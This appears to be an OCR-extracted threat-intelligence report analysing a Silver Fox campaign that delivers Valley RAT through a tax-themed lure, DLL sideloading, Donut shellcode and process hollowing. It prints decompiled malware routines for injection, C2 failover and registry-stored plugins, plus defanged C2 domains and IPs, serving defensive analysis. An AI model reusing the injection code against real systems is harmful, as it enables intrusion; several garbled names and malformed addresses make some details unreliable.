(!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, 